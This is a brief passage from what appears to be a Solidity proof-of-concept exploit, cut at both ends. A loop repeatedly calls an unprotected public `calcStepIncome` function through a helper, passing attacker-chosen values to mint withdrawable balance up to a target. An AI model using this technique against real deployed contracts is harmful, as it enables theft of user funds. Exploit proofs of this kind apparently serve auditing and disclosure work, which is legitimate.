        // has an active PID, the unauthorized public `calcStepIncome` call mints withdrawable accounting.
        while (canWithdrawAfterMint < targetWithdrawable) {
            uint256 attackerChosenValue = targetWithdrawable - canWithdrawAfterMint;
            uint8 attackerChosenDividend = 100;

            (bool calcOk,) = helper.callCalcStep(attackerPid, attackerChosenValue, attackerChosenDividend);
